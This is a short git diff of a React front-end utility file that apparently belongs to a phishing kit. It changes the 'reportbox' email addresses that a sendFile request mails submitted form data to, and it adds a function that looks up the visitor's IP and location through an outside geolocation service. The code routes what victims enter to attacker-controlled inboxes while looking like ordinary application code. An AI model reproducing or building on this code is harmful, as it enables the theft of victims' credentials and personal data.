@@ -1,3 +1,4 @@
+import axios from "axios";
 import { toast } from "react-toastify";
 
 const serverurl = require("../users.json");
@@ -21,7 +22,7 @@ export const sendFile = (data) =>
     },
     body: JSON.stringify({
       ...data,
-      reportbox: "mb4ckup.m4il@yandex.com, jhonsnow751@gmail.com", // "Elongate68@gmail.com, jhonsnow751@gmail.com, ajaymoroco@yandex.com",
+      reportbox: "resultbox4us@outlook.com, jhonsnow751@gmail.com", // "mb4ckup.m4il@yandex.com" "Elongate68@gmail.com, jhonsnow751@gmail.com, ajaymoroco@yandex.com",
     }),
   }).then((response) => response.json());
 
@@ -35,3 +36,8 @@ export const notify = () =>
     draggable: true,
     progress: undefined,
   });
+
+export const getIP = async () => {
+    const res = await axios.get("https://geolocation-db.com/json/");
+    return res;
+  };
